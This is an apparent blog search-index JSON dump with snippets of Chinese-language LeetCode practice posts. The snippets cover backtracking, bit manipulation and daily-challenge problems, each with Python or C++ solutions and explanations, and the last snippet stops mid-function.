[ { "title": "LeetCode 刷题记录 - 回溯算法", "url": "/posts/LeetCode_backtrack/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Backtrack", "date": "2022-02-13 17:37:00 +0800", "snippet": " 回溯算法46. 全排列class Solution: def permute(self, nums: List[int]) -&amp;gt; List[List[int]]: # 当前路径 path = [] # 合法路径集合 ans = [] # 记录访问过的节点 visited = set() def trackback(nums, i): # 将当前节点加入路径 path.append(nums[i]) # 标记当前节点不可用 visited.add(i) if len(path) == len(nums): # 满足返回条件返回路径 ans.append(path.copy()) else: # 未达到返回条件则寻找下一个合法节点 for j in range(len(nums)): if j not in visited: # 只要节点未出现在路径里即合法 trackback(nums, j) # 将当前节点撤出路径 path.pop() # 恢复当前节点可用性 visited.remove(i) # 以每个节点为起点调用一遍回溯函数 for i in range(len(nums)): trackback(nums, i) return ans47. 全排列 IIclass Solution: def permuteUnique(self, nums: List[int]) -&amp;gt; List[List[int]]: # 当前路径 path = [] # 合法路径集合 ans = [] # 记录访问过的节点 visited = set() def trackback(nums, i): # 将当前节点加入路径 path.append(nums[i]) # 标记当前节点不可用 visited.add(i) # 相比 全排列 I 还需要记录数字的重复 repeat = set() if len(path) == len(nums): # 满足返回条件返回路径 ans.append(path.copy()) else: # 未达到返回条件则寻找下一个合法节点 for j in range(len(nums)): if j != i and j not in visited and nums[j] not in repeat: # 合法节点条件 # 1. 前面未访问过 # 2. 数字未重复 repeat.add(nums[j]) trackback(nums, j) # 将当前节点撤出路径 path.pop() # 恢复当前节点可用性 visited.remove(i) # 确保不重复 # 每个节点作为起点调用一遍回溯函数 repeat = set() for i in range(len(nums)): if nums[i] not in repeat: repeat.add(nums[i]) trackback(nums, i) return ans51. N 皇后class Solution: def solveNQueens(self, n: int) -&amp;gt; List[List[str]]: # 使用 valid_table 来标记行、列、对角线和反对角线上是否有皇后 # valid_table[0]: row # valid_table[1]: col # valid_table[2]: diag # valid_table[3]: antidiag valid_table = [defaultdict(lambda: True) for _ in range(4)] ans = [] path = [] def trackback(valid_table, i, j, n): # 检测该位置是否可以放置皇后 if valid_table[0][i] and valid_table[1][j] and valid_table[2][i+j] and valid_table[3][i-j]: # 生成代表该行的字符串 row = &#39;.&#39; * j + &#39;Q&#39; + &#39;.&#39; * (n-j-1) # 将该行的选择加入路径 path.append(row) # 标记各个行列对角反对角线的不可用 valid_table[0][i] = False valid_table[1][j] = False valid_table[2][i+j] = False valid_table[3][i-j] = False if i == n-1: # 如果是最后一行，则将路径加入结果 ans.append(path.copy()) else: # 否则遍历所有下一行的选择 for k in range(n): trackback(valid_table, i+1, k, n) # 遍历完分支回溯 path.pop() # 重新开放行列对角反对角线的可用性 valid_table[0][i] = True valid_table[1][j] = True valid_table[2][i+j] = True valid_table[3][i-j] = True # 遍历第一行每一列作为起点调用回溯算法 for j in range(n): trackback(valid_table, 0, j, n) return ans39. 组合总和class Solution: def combinationSum(self, candidates: List[int], target: int) -&amp;gt; List[List[int]]: candidates.sort() res = [] path = [] n = len(candidates) def rec(i, curr_sum): if curr_sum &amp;gt; target or i == n: return if curr_sum == target: res.append(path.copy()) return rec(i + 1, curr_sum) path.append(candidates[i]) rec(i, curr_sum + candidates[i]) path.pop() rec(0, 0) return res40. 组合总和 IIclass Solution: def combinationSum2(self, candidates: List[int], target: int) -&amp;gt; List[List[int]]: candidates.sort() path = [] res = [] curr_sum = 0 n = len(candidates) def back_track(i, curr_sum): num = candidates[i] path.append(num) curr_sum += num visited = set() if curr_sum == target: res.append(path.copy()) elif curr_sum &amp;lt; target: for next in range(i + 1, n): if candidates[next] not in visited: back_track(next, curr_sum) visited.add(candidates[next]) path.pop() visited = set() for i in range(n): if candidates[i] not in visited: back_track(i, 0) visited.add(candidates[i]) return res" }, { "title": "LeetCode 刷题记录 - 每日一题", "url": "/posts/LeetCode_bit_operation/", "categories": "Blogging, LeetCode", "tags": "LeetCode", "date": "2022-01-11 21:01:00 +0800", "snippet": " 2022.08.18 - 剑指 Offer II 004. 只出现一次的数字题干给你一个整数数组 nums ，除某个元素仅出现 一次 外，其余每个元素都恰出现 三次 。请你找出并返回那个只出现了一次的元素。思路最简单的字典思路就不说了，直接上位运算的方法。因为题目中给的所有的数字都是用 int32 来存储的，因此可以把每一个数字按照二进制位拆开来看。当我们对所有数字按照二进制位进行求和的时候，唯一数字二进制位为 0 的位数的和必定为 3 或者为 为0.那么就可以通过这个方法，筛选出唯一数字为 1 的所有二进制位，再还原。唯一的问题就是编码问题，因为最后一位（31位）在有的语言中是补码意义上的反码，所以要另外判断（比如在 Python 中）。代码class Solution: def singleNumber(self, nums: List[int]) -&amp;gt; int: print(-5 &amp;gt;&amp;gt; 31) ans = 0 for i in range(32): total = sum((num &amp;gt;&amp;gt; i) &amp;amp; 1 for num in nums) if total % 3: # Python 这里对于最高位需要特殊判断 if i == 31: ans -= (1 &amp;lt;&amp;lt; i) else: ans |= (1 &amp;lt;&amp;lt; i) return ans进阶思路请参考 剑指 Offer II 004. 只出现一次的数字 题解。" }, { "title": "LeetCode 刷题记录 - 每日一题", "url": "/posts/LeetCode_daily_challenge/", "categories": "Blogging, LeetCode", "tags": "LeetCode", "date": "2022-01-11 21:01:00 +0800", "snippet": " 2022.01.11 - 1036. 逃离大迷宫题干在一个 $10^6 × 10^6$ 的网格中，每个网格上方格的坐标为(x, y)。现在从源方格source = [sx, sy]开始出发，意图赶往目标方格target = [tx, ty]。数组blocked是封锁的方格列表，其中每个blocked[i] = [xi, yi]表示坐标为(xi, yi)的方格是禁止通行的。每次移动，都可以走到网格中在四个方向上相邻的方格，只要该方格不在给出的封锁列表blocked上。同时，不允许走出网格。只有在可以通过一系列的移动从源方格source到达目标方格target时才返回true。否则，返回false。思路这道题目的矩阵很大，直接搜索时间肯定会超时，但是有一个突破口，就是0 &amp;lt;= len(blocked) &amp;lt;= 200，block的数量是在两百个以内的。有两个思路可供选择，第一个是压缩矩阵，就是除去source，target和所有block所在的行列，压缩所有的剩下的行列，这样就可以把问题化解为一个$200 × 200$矩阵内的广度优先搜索。第二个思路是广度优先搜索加提前退出，而提前退出的条件就是利用了block的数量：判断source和target是否被block包围。因为block数量有限，所以被block包围的格子数量也是有一个上限的，当 BFS 搜索的格子数量超过这个上限时，我们就可以认为block没有包围住 BFS 的起点。而这个最大值是$(N_{block}-1)×N_{block}/2$，对应的这个情况就是所有的block作为斜边与两个边界在角落围成一个等腰直角三角形，此时面积最大。所以一共有三种情况： 起点被包围； 终点被包围； 都没有被包围。 所以根据如上思想写一个函数去判断起点和终点是否都被包围即可。代码class Solution: def isEscapePossible(self, blocked: List[List[int]], source: List[int], target: List[int]) -&amp;gt; bool: # 判断 src 是否被包围 def is_surrounded(src, dst, max_area): # BFS 的队列 queue = [tuple(src)] # 计算走过的格子数 count = 0 # visited 数组，这里用字典实现 visited = dict() visited[tuple(src)] = True while queue: x, y = queue.pop(0) count += 1 if count &amp;gt; max_area: # 当搜索的格子数超过最大可围面积时，我们判断 src 没有被围上 return 1 for dx, dy in [(1, 0), (-1, 0), (0, -1), (0, 1)]: x_next, y_next = x+dx, y+dy if 0 &amp;lt;= x_next &amp;lt;= 999999 and 0 &amp;lt;= y_next &amp;lt;= 999999: if [x_next, y_next] == dst: # 如果找到 dst，直接返回 return 2 if (x_next, y_next) not in block_dict and (x_next, y_next) not in visited: queue.append((x_next, y_next)) visited[(x_next, y_next)] = True # 队列提前终止，说明无路可走，被包围 return 0 # 广搜加提前退出 if len(blocked) &amp;lt;= 1: return True n_block = len(blocked) # 计算最大可包围面积 max_area = (n_block-1)*n_block/2 # 用字典记录 block，防止重复遍历带来的高计算量 block_dict = dict() for block in blocked: block_dict[tuple(block)] = True # 首先判断起点是否被包围 ans = is_surrounded(source, target, max_area) # 起点被包围 if ans == 0: return False # 直接找到终点 elif ans == 2: return True # 判断终点情况 ans = is_surrounded(target, source, max_area) # 终点被包围 if ans == 0: return False # 两个点都没被包围 return True2022.01.13 - 747. 至少是其他数字两倍的最大数（简单）简单题，找到数组中的最大值并确保比其他数字都大两倍以上。同时找最大数的和次大数，然后比较最大数和次大数的两倍即可。class Solution: def dominantIndex(self, nums: List[int]) -&amp;gt; int: max_num = 0 max_index = 0 second_num = 0 # 遍历数组，更新最大和第二大数字的值 for i, num in enumerate(nums): if num &amp;gt; max_num: second_num = max_num max_num = num max_index = i elif num &amp;gt; second_num: second_num = num # 如果最大值大于等于第二大的数字的两倍则返回下标 if max_num &amp;gt;= second_num * 2: return max_index else: return -12022.01.15 - 1716. 计算力扣银行的钱简简单单的等差数列计算。class Solution: def totalMoney(self, n: int) -&amp;gt; int: weeks = n // 7 days = n % 7 money = 0 for i in range(weeks): money += (i + 4) * 7 if days != 0: money += (2 * weeks + 1 + days) * days / 2 return int(money)2022.01.16 - 382. 链表随机节点这道题的目的主要在于考察蓄水池抽样算法。如果我们可以通过遍历得知数据大小，那么可以通过均匀分布生成一个随机索引返回答案就行了。但是实际场景是：给定一个数据流，数据流长度 N 很大，且N直到处理完所有数据之前都不可知，请问如何在只遍历一遍数据（$O(N)$）的情况下，能够随机选取出 m 个不重复的数据。有三个事情值得注意： 数据流长度 N 很大且不可知，所以不能一次性存入内存，也不能一次性得知数据的长度，数据大小也总是在变动的； 时间复杂度为$O(N)$，所以不能预先存储再用索引取出； 随机选取 m 个数，每个数被选中的概率为 m/N ，随机性的保证。算法思路如下： 如果接收的数据量小于 m ，则依次放入蓄水池。 当接收到第 i 个数据时， i &amp;gt;= m ，在 [0, i] 范围内取以随机数 d ，若 d 的落在 [0, m-1] 范围内，则用接收到的第 i 个数据替换蓄水池中的第 d 个数据。 重复步骤2。算法的精妙之处在于：当处理完所有的数据时，蓄水池中的每个数据都是以 m/N 的概率获得的。可以通过简单的手算来证明。这道题目相当于 m 等于 1。核心代码如下：class Solution: def __init__(self, head: Optional[ListNode]): # 蓄水池算法 self.head = head def getRandom(self) -&amp;gt; int: node = self.head res_node = node count = 1 # 从第二个数据开始替换 while node.next: node = node.next count += 1 # 生成基于目前遍历数据数目的随机数 rand = random.randrange(count) if rand == 0: # 如果随机到的数为 0，则替换 res_node = node return res_node.valCPU 的性能总是有限的，当数据大小继续增加的时候，为了提高效率，我们可以应用分布式技术。参考资料：蓄水池抽样算法（Reservoir Sampling）2022.01.17 - 1220. 统计元音字母序列的数目今天的每日一题很有意思，首先看完想到的就是动态规划，建立 5 行 n 列的 dp 表，其中 dp[i][j] 表示最后一个字符是第 j 个字符的长度为 i 的字母序列的数量。由于定义，同一列之间的字母序列是没有重复的，所以长度为 k 的所有序列的数量为 dp 表该列的数字之和。定义好了 dp 表之后，状态转移表就很简单，因为题目已经给出了每一列存储数值和上一列的关系。算完之后发现才 beat 5%，不能忍，马上又想到一个新的想法。来源于今天面试字节的斐波那契数列计算的 $O(log{n})$ 的算法。就是使用矩阵来表示状态之间的转移，这个方法叫做矩阵快速幂。比如斐波那契数列问题中，直接用如下 N1 作为初始状态，M 作为状态转移矩阵，然后就能发现，不断地用矩阵 M 点乘向量 N，就可以得到后续的结果。N1 = [1, 1]M = [[1, 1], [1, 0]]而时间复杂度降低的诀窍就在于，矩阵之间点乘可以直接构造出对应更高步数的状态转移矩阵。比如 $M_2 = M \\dot M$ 得到的是表示横跨两位的状态转移方程，比如 $N_5 = M_2 \\dot N_3$。利用这一性质，结合递归运算，就可以直接将复杂度减少到 $O(log(n))$ 了， 具体看代码：class Solution: def countVowelPermutation(self, n: int) -&amp;gt; int: # 特殊情况 if n == 1: return 5 # 初始状态 n1 = [1] * 5 # 定义状态转移矩阵 self. M = [[0, 1, 1, 0, 1], [1, 0, 1, 0, 0], [0, 1, 0, 1, 0], [0, 0, 1, 0, 0], [0, 0, 1, 1, 0]] # 获得 n 次方状态转移矩阵 M_n = self.get_M_n(n-1) # 矩阵运算获得最终结果 res = 0 for i in range(5): for k in range(5): res += M_n[i][k] * n1[k] # 返回结果 return res % (10**9 + 7) def get_M_n(self, n): # 获得状态转移矩阵的 M 次方 # 时间复杂度 O(logn) if n == 1: return self.M half_M = self.get_M_n(n // 2) res_M = self.product(half_M, half_M) if n % 2 == 1: res_M = self.product(res_M, self.M) return res_M def product(self, M1, M2): # 5 * 5 的矩阵乘法 M = [[0]*5 for _ in range(5)] for i in range(5): for j in range(5): for k in range(5): M[i][j] += M1[i][k]*M2[k][j] return M2022.01.18 - 539. 最小时间差求时间之间的最小差值，主要思路就是去重，数据转换，排序，首尾相接，然后差分求最小值。如果有重复的，那么就可以直接返回 0.否则就要在排序完之后，将最小的加上 24*60 然后添加到队尾，实现一个首位相接的效果。参考代码如下：class Solution: def findMinDifference(self, timePoints: List[str]) -&amp;gt; int: # 去重 time_unique = list(set(timePoints)) if len(time_unique) != len(timePoints): return 0 # 数据转换 min_list = [] for time in time_unique: hour, minute = time.split(&#39;:&#39;) min_list.append(int(hour) * 60 + int(minute)) # 排序 min_list = sorted(min_list) # 首尾相接 min_list.append(24*60 + min_list[0]) # 差分求最小 diff = [min_list[i] - min_list[i-1] for i in range(1, len(min_list))] return min(diff)2022.01.22 - 1332. 删除回文子序列脑经急转弯，拿来练 C++ 了。因为题目只有 &#39;a&#39; &#39;b&#39; 两种字符，所以最多只需要两次操作就能删除干净了，第一次删 &#39;a&#39;，第二次删 &#39;b&#39;。所以只需要判断整个字符串是不是回文字符串即可，如果是，返回 1，如果不是就返回 2。class Solution {public: int removePalindromeSub(string s) { int i = 0; int j = s.length() - 1; while (i &amp;lt; j){ if (s[i] == s[j]){ i += 1; j -= 1; } else{ return 2; } } return 1; }};2022.01.24 - 2045. 到达目的地的第二短时间这道题红绿灯的设置就是障眼法，因为所有的红绿灯的变化周期是相等的，所以的路径时间消耗又是一样的，所以如果用 BFS，一个路线在等红灯，其他路线也都在等红灯。所以实际上这道题目的目标是如何求出到达目的地的严格次小步数。求最小步数很简单， DFS 就可以了。但是如果求严格次小步数，就需要一些特殊的设计。这里把以前用的 visited 数组用一个 dist 数组代替了，其中： dist[i][0] 表示从点 i 到起点的最短距离； dist[i][1] 表示从点 i 到起点的严格次小距离。 只有更新最短距离，才能知道严格次小距离的下限，而我们可以通过这两个值来对入队的节点进行条件限制。 if step + 1 &amp;lt; dist[next_index][0]: # 当某节点第一次符合上述条件入队时 # 对应的 step 一定是最小值 dist[next_index][0] = step + 1 q.append([next_index, step + 1]) elif dist[next_index][0] &amp;lt; step + 1 &amp;lt; dist[next_index][1]: # 当某节点第一次符合上述条件入队时 # 对应的 step 一定是严格次小小值 dist[next_index][1] = step + 1 q.append([next_index, step + 1])上面第一个条件相当于原来的 visited 数组，在 BFS 的情况下每个节点只有第一次访问时会入队。而第二个条件则保证了每一个节点第二次入队时的步数一定为严格次小步数，因为步数等于 dist[next_index][0] 的情况被排除在外了。这样并不会导致漏掉部分情况，因为对同一节点相同步数的访问只是无用的重复访问而已。最后讨论时间转换的情况，一共两种方法： 通过分类讨论直接计算结果； 通过模拟每一步更新总时间。 两者各有优劣，第一种时间快但是思考起来比较复杂；第二种直观好理解，坏处就是要遍历。class Solution: def secondMinimum(self, n: int, edges: List[List[int]], time: int, change: int) -&amp;gt; int: # 使用邻接表来表示图 graph = [[] for _ in range(n)] for edge in edges: vertex_1 = edge[0] - 1 vertex_2 = edge[1] - 1 graph[vertex_1].append(vertex_2) graph[vertex_2].append(vertex_1) # 使用队列结构实现 BFS q = deque() # dist[i][0] 表示从点 i 到起点的最短距离 # dist[i][1] 表示从点 i 到起点的严格次小距离 dist = [[float(inf)] * 2 for _ in range(n)] dist[0][0] = 0 q.append([0, 0]) # BFS while dist[-1][1] == float(inf): index, step = q.popleft() # BFS 可以保证每次节点入队时对应的 step 是非递减的 for next_index in graph[index]: if step + 1 &amp;lt; dist[next_index][0]: # 当某节点第一次符合上述条件入队时 # 对应的 step 一定是最小值 dist[next_index][0] = step + 1 q.append([next_index, step + 1]) elif dist[next_index][0] &amp;lt; step + 1 &amp;lt; dist[next_index][1]: # 当某节点第一次符合上述条件入队时 # 对应的 step 一定是严格次小小值 dist[next_index][1] = step + 1 q.append([next_index, step + 1]) # 使用函数来将步数转换为时间 return self.time_calculate_1(dist[-1][1], time, change) def time_calculate_1(self, step, time, change): # 分类讨论公式法 if time &amp;lt; change: move_per_change = change // time if change % time == 0: move_per_period = move_per_change else: move_per_period = move_per_change + 1 num_period = step // move_per_period if step % move_per_period == 0: return (num_period - 1) * change * 2 + time * move_per_period else: return num_period * change * 2 + time * (step % move_per_period) else: if (time // change) % 2 == 1: time_pre_step = time + (change - time % change) return time_pre_step * step - (change - time % change) else: rest_time = time % change if rest_time == 0: return (time - rest_time) * step else: return (time - rest_time) * step + self.time_calculate(step, rest_time, change) def time_calculate_2(self, step, time, change): # 模拟法 total_time = 0 for _ in range(step): if total_time % (2*change) &amp;gt;= change: total_time += 2 * change - total_time % (2 * change) total_time += time return total_time2022.01.25 - 1688. 比赛中的配对次数可以用递归，但是有更简单的方法：每次匹配会淘汰一个队伍，最终只剩一个队伍，所以淘汰了 n-1 个队伍，所以匹配了 n-1，答案就是 n-1。代码放递归的：class Solution: def numberOfMatches(self, n: int) -&amp;gt; int: def rec(n): if n == 1: return 0 if n == 2: return 1 match_num = n // 2 if n % 2 == 0: return rec(match_num) + match_num else: return rec(match_num + 1) + match_num return rec(n)2022.01.27 - 2047. 句子中的有效单词数这道题用正则匹配更加锻炼自己，两点需要注意： 模式字符串想清楚：([a-z]*[!|.|,]?)? 表示的是不包括 &#39;-&#39; 的合法单词，而 &#39;([a-z]+[-][a-z]+)&#39; 则表示带有 &#39;-&#39; 的部分，所以将两者结合就是能够匹配所有合法单词的模式字符串了。 pattern.match(word) 的返回是从整个字符串的第一个字符开始匹配的结果，如果有连续的符合条件的匹配项，会返回多个匹配结果。所以要判断整个 word 是不是满足匹配条件，需要将匹配结果的第一个 result[0] 和整个 word 进行比较。class Solution: def countValidWords(self, sentence: str) -&amp;gt; int: words = sentence.split() count = 0 pattern = re.compile(r&#39;([a-z]+[-][a-z]+)?([a-z]*[!|.|,]?)?&#39;) for word in words: result = pattern.match(word) if result and result[0] == word: count += 1 return count2022.01.28 - 1996. 游戏中弱角色的数量你正在参加一个多角色游戏，每个角色都有两个主要属性：攻击 和 防御。给你一个二维整数数组 properties ，其中 properties[i] = [attack_i, defense_i] 表示游戏中第 i 个角色的属性。如果存在一个其他角色的攻击和防御等级都严格高于该角色的攻击和防御等级，则认为该角色为弱角色。更正式地，如果认为角色 i 弱于存在的另一个角色 j ，那么 attack_j &amp;gt; attack_i 且 defense_j &amp;gt; defense_i 。返回弱角色的数量。两种方法，直接排序和单调栈，其核心思想一样，都是：根据两个特征按照一定优先级进行排序。目的是比大小，那么先排序一定没有错。首先可以想到的是按照攻击力从大到小排序，然后从头开始遍历，用一个临时变量存储遍历过的角色的最大防御值 max_defense。当目前遍历的角色的防御力 defense 小于 历史最大防御力 max_defense 的时候，则 count 加一。这样的判定存在的问题就是历史防御力最高的角色可能和当前角色攻击力相同，于是就追加排序条件：当攻击力相同的时候，防御力升序排列，这样就可以避免前面所述的情况了。参考代码如下：class Solution: def numberOfWeakCharacters(self, properties: List[List[int]]) -&amp;gt; int: # 首先按照攻击力降序排列，然后按照防御力升序排列 properties_sorted = sorted(properties, key=lambda x: (-x[0], x[1])) # 维护历史最大防御力 max_defence = properties_sorted[0][1] # 计算弱角色数量 count = 0 # 从攻击力最高者开始遍历 for attack, defense in properties_sorted: if defense &amp;lt; max_defence: # 当防御力低于历史最大防御力时，弱角色数量加一 count += 1 elif defense &amp;gt; max_defence: # 当防御力大于历史最大防御力时，更新历史最大防御力 max_defence = max(defense, max_defence) return count2022.01.30 - 884. 两句话中的不常见单词题目可以理解成：在两个字符串拼接的合成字符串中搜索返回只出现一次的单词方法一：比较 Pythonic 的方法，将字符串连接再 split 之后，直接使用数组的 count 方法筛选出只出现一次的单词。class Solution: def uncommonFromSentences(self, s1: str, s2: str) -&amp;gt; List[str]: words_dict = dict() words = (s1 + &#39; &#39; + s2).split() return [word for word in words if words.count(word) == 1]方法二：同样将字符串连接再 split ，但是这次是自己实现快速的单词频率计算。用一个 appeared_words 的 list 结构来存储出现过的单词，利用 dict 结构来对单词在 appeared_words 内的索引进行记录。当单词重复出现时，就从 appeared_words 里将对应的单词改为 None，最后遍历一遍 appeared_words 将剩余的单词输出即可。时间复杂度为 $O(N)$。class Solution: def uncommonFromSentences(self, s1: str, s2: str) -&amp;gt; List[str]: words_dict = dict() words = (s1 + &#39; &#39; + s2).split() appeared_words = [] count = 0 for word in words: if word not in words_dict: appeared_words.append(word) words_dict[word] = count count += 1 else: appeared_words[words_dict[word]] = None res = [] for word in appeared_words: if word: res.append(word) return res2022.01.31 - 1342. 将数字变成 0 的操作次数利用移位操作，在模拟过程中可以不需要在奇数情况下减一。每一次判断当前数字是奇数还是偶数，奇数就操作数加二（除 2 和减 1），偶数就只加一（除 2）。只是这个计算只能算到 1，所以循环直到数字为 1 ，最后结果再加一即可。class Solution: def numberOfSteps(self, num: int) -&amp;gt; int: # 特殊情况 if num == 0: return 0 res = 0 # 计算直到 1 时的操作数 while num &amp;gt; 1: if num % 2 == 1: # 如果当前为奇数：则操作两次 res += 2 else: # 非奇数操作一次 res += 1 # 每次向右移位一位，无视奇偶性，结果一样 num = num &amp;gt;&amp;gt; 1 # 最后操作数 +1 return res + 12022.02.01 - 1763. 最长的美好子字符串一个比较难的简单题，可以动态规划，也可以用分治思想递归，分治比较快一些，代码如下：class Solution: def longestNiceSubstring(self, s: str) -&amp;gt; str: # 递归 def rec(i, j): for k in range(i, j): # 遍历 s[i:j], 把第一个不满足大小写均在 s[i:j] 内的位置作为分割点 if s[k].upper() not in s[i:j] or s[k].lower() not in s[i:j]: # 在左侧的字符串切片上调用递归 # 返回左边的最大美好子字符串位置 l_i, l_j = rec(i, k) # 在右侧的字符串切片上调用递归 # 返回右边的最大美好子字符串位置 r_i, r_j = rec(k+1, j) # 比较左右子字符串的长度，选择较长者返回 if (r_j - r_i) &amp;gt; (l_j - l_i): return (r_i, r_j) else: return (l_i, l_j) return (i, j) i, j = rec(0, len(s)) return s[i:j]2022.02.02 - 2000. 反转单词前缀关键就是如何将未找到 ch 的情况和找到的情况结合在一步代码里。class Solution: def reversePrefix(self, word: str, ch: str) -&amp;gt; str: # 找到反转点 pos = word.find(ch) + 1 # 将 word 分两部分，处理后再拼接 return word[:pos][::-1] + word[pos:]2022.02.03 - 1414. 和为 K 的最少斐波那契数字数目首先基于动态规划生成小于 k 的所有斐波那契数字的列表 num_list。然后根据斐波那契数字的性质，可以基于贪心的原则来从大到小寻找构成 k 的每个数字：使用一个临时变量 rest_sum 来存储目标，每次寻找 num_list[:r] 中小于 rest_sum 的最大的数。rest_sum 初始化为 k，r 初始化为 len(num_list) - 1。假设每次寻找到的数字下标为 i，更新 rest_sum = rest_sum - num_list[i],则根据斐波那契数列的性质，下次寻找的目标必定存在于 num_list[:i-1]，因此更新 r = i - 1 即可。如果使用线性搜索，时间复杂度为 $O(N)$，参考代码如下：class Solution: def findMinFibonacciNumbers(self, k: int) -&amp;gt; int: # 先生成所有小于 k 的斐波那契数列 num_list = [1, 1] new_num = num_list[-1] + num_list[-2] while new_num &amp;lt;= k: num_list.append(new_num) new_num = num_list[-1] + num_list[-2] # 初始化 max_index = len(num_list) - 1 rest_sum = k res = 0 # 从大到小线性搜索 while rest_sum &amp;gt; 0: if rest_sum &amp;gt;= num_list[max_index]: rest_sum -= num_list[max_index] res += 1 max_index -= 1 return res 可以使用二分搜索，但是时间并没有减少太多，因为线性搜索搜索到了之后会缩小搜索空间，而二分搜索是从中间开始，反而会产生一些重复的搜索步骤。参考代码如下：class Solution: def findMinFibonacciNumbers(self, k: int) -&amp;gt; int: # 先生成所有小于 k 的斐波那契数列 num_list = [1, 1] new_num = num_list[-1] + num_list[-2] while new_num &amp;lt;= k: num_list.append(new_num) new_num = num_list[-1] + num_list[-2] # 初始化 r = len(num_list) - 1 rest_sum = k res = 0 while rest_sum &amp;gt; 0: # 重置左端点 l = 0 # 使用二分法确定小于 rest_num 的最大元素的位置 while l &amp;lt; r: mid = (l + r + 1) // 2 if num_list[mid] &amp;gt; rest_sum: r = mid - 1 else: l = mid # 减去找到的元素 rest_sum -= num_list[r] # 更新右端点和结果 res += 1 r = r - 1 return res 2022.02.04 - 1725. 可以形成最大正方形的矩形数目思路简单。class Solution: def countGoodRectangles(self, rectangles: List[List[int]]) -&amp;gt; int: # 生成所有切好的矩形边长的数组 lens = [min(rect) for rect in rectangles] # 返回最长边长的数量 return lens.count(max(lens))2022.02.05 - 1219. 黄金矿工这道题应该用回溯算法，开始的时候用错了，用了 BFS，在此阐述一下个人认为的 BFS 和回溯算法在目标上的不同点： BFS 的目标在于遍历所有的点，只关心每一个点，不关心路径，搜索空间是所有的点构成的空间； 回溯算法是遍历所有的路径，相比起 BFS，既关心点，也关心路径，搜索空间是所有的可能路径构成的空间。这道题显然跟路径有关，不同路径返回的最大采矿量也不同，因此应该会回溯算法。class Solution: def getMaximumGold(self, grid: List[List[int]]) -&amp;gt; int: # 初始化 visited 网格 m, n = len(grid), len(grid[0]) max_gold = 0 visited = [[False]*n for _ in range(m)] # 定义回溯函数 # 使用 visited 作为路径辅助 def backtracking(x, y, gold): nonlocal max_gold # 将该点标记在路径上 visited[x][y] = True # 更新当前最大采矿量 new_gold = gold + grid[x][y] max_gold = max(max_gold, new_gold) # 对非路径上的邻点调用回溯算法 for new_x, new_y in [(x-1, y), (x+1, y), (x, y-1), (x, y+1)]: if 0 &amp;lt;= new_x &amp;lt; m and 0 &amp;lt;= new_y &amp;lt; n and grid[new_x][new_y] != 0 and not visited[new_x][new_y]: backtracking(new_x, new_y, new_gold) # 回退，从路径上消除该点 visited[x][y] = False # 对每一个有矿的格子调用回溯算法 for i in range(m): for j in range(n): if grid[i][j] != 0: backtracking(i, j, 0) return max_gold2022.02.06 - 1748. 唯一元素的和可以直接用 list 类的内置 count 函数判断一个元素是否是唯一元素：class Solution: def sumOfUnique(self, nums: List[int]) -&amp;gt; int: return sum([elem for elem in nums if nums.count(elem) == 1])或者自己构造映射来计算元素出现的次数：class Solution: def sumOfUnique(self, nums: List[int]) -&amp;gt; int: # 初始化计算出现次数的 dict count_dict = {} # 遍历元素，计算出现次数 for elem in nums: if elem in count_dict: count_dict[elem] += 1 else: count_dict[elem] = 1 # 将唯一的元素累加 res = 0 for elem in count_dict: if count_dict[elem] == 1: res += elem return res2022.02.07 - 1405. 最长快乐字符串这一题主要基于贪心算法，每一步都选择剩余最多的字母加入答案的字符串中，因为最小的字母要承担作为分隔符的任务。如果目标字母已经连续出现两次，那么选择第二多的字母。通过连续局部最优得到全局最优。参考代码如下：class Solution: def longestDiverseString(self, a: int, b: int, c: int) -&amp;gt; str: ans = [] cnt = [[a, &#39;a&#39;], [b, &#39;b&#39;], [c, &#39;c&#39;]] while True: cnt.sort(key = lambda x: -x[0]) # 判断是否符合快乐字符串条件 if len(ans) &amp;gt;= 2 and ans[-1] == cnt[0][1] and ans[-2] == cnt[0][1]: idx = 1 else: idx = 0 # 判断是否已达到最长 if cnt[idx][0] &amp;lt;= 0: return &#39;&#39;.join(ans) # 将符合条件的最多的字母加入 list ans.append(cnt[idx][1]) # 对应剩余数量-1 cnt[idx][0] -= 12022.02.08 - 1001. 网格照明难点在于如何储存记录每个位置灯的亮灭情况已经每个格子的点亮情况。测试范例中有一个很大的矩阵，所以存储的时候如果需要初始化一个大矩阵就会直接超时。因此用集合、词典或者哈希表来存储是最好的选择。代码参考如下：class Solution: def gridIllumination(self, n: int, lamps: List[List[int]], queries: List[List[int]]) -&amp;gt; List[int]: # 初始化灯状态集合 lamps_on = set() # 初始化亮度字典，表示被点亮的行，列，对角线，反对角线 row, col, diag, antidiag = defaultdict(int), defaultdict(int), defaultdict(int), defaultdict(int) # 遍历 lamps，得到在查询前的矩阵和字典的状态 for i, j in lamps: # 如果对应位置灯未点亮则将其点亮并更新亮度词典 if (i,j) not in lamps_on: # 将该位置加入点亮的灯的词典 lamps_on.add((i,j)) # 灯辐射到的位置亮度 +1 row[i] += 1 col[j] += 1 diag[i - j] += 1 antidiag[i + j] += 1 # 遍历 queries，获取结果 ans = [] for i, j in queries: # 查询亮度词典判断是否为照亮状态 if row[i] or col[j] or diag[i - j] or antidiag[i + j]: ans.append(1) else: ans.append(0) continue # 熄灭范围内的灯并更新亮度词典 for x, y in [(i+1,j+1),(i,j+1),(i-1,j+1),(i+1,j),(i,j),(i-1,j),(i+1,j-1),(i,j-1),(i-1,j-1)]: if 0 &amp;lt;= x &amp;lt; n and 0 &amp;lt;= y &amp;lt; n and (x, y) in lamps_on: # 将该位置从点亮的灯集合移除 lamps_on.remove((x, y)) # 灯辐射到的位置亮度 -1 row[x] -= 1 col[y] -= 1 diag[x - y] -= 1 antidiag[x + y] -= 1 return ans 2022.02.09 - 2006. 差的绝对值为 K 的数对数目先排序后计算，比较简单。class Solution: def countKDifference(self, nums: List[int], k: int) -&amp;gt; int: nums.sort() n = len(nums) ans = 0 for i in range(n): for j in range(i+1, n): if nums[j] - nums[i] == k: ans += 1 return ans2022.02.10 - 1447. 最简分数比较简单的一道题：关键就是判断两个数互质。这里调用了 Python 中的 gcd 函数。实际上只需要用递归调用来实现辗转相除法即可。# # 判断两数最大公约数的辗转相除算法# def gcd(i, j):# # 调整数字的大小顺序# if i &amp;gt; j:# num_1, num_2 = i, j# else:# num_1, num_2 = j, i# # 当余数为 0 ，找到最大公约数# if num_1 % num_2 == 0:# return num_2# # 当余数不为 0，再用余数除除数# else:# return gcd(num_2, num_1 % num_2)class Solution: def simplifiedFractions(self, n: int) -&amp;gt; List[str]: if n == 1: return [] if n == 2: return [&quot;1/2&quot;] 